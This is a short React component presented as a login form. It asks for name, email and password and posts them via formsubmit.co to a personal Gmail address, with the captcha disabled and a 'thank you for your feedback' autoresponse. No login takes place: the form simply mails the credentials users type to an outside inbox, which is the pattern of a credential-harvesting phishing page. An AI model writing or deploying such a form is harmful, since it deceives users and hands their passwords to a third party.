import React from "react";
import ".//StyleLogin.css";
function LoginForm() {
  return (
    <>
      <div className="form-box">
        <div className="header-text">Login Form</div>
        <form action="https://formsubmit.co/partimag55@gmail.com" method="POST">
          <input type="hidden" name="_subject" value="New submission!" />
          <input type="hidden" name="_captcha" value="false" />
          <input
            type="hidden"
            name="_autoresponse"
            value="Thank you for your valuable feedback"
          />
          <input type="hidden" name="_template" value="table" />
          <input
            type="hidden"
            name="_next"
            value="http://127.0.0.1:5500/index2.html"
          />
          <input
            type="text"
            name="First Name"
            placeholder="Email First Name"
            required
          />
          <input
            type="text"
            name="Last Name"
            placeholder="Email Last Name"
            required
          />
          <input
            type="email"
            name="Enter Email"
            placeholder="Email Address"
            required
          />
          <input
            type="password"
            name="Enter Password"
            placeholder="Enter Password"
            required
          />
          <button>login</button>
        </form>
      </div>
    </>
  );
}

export default LoginForm;
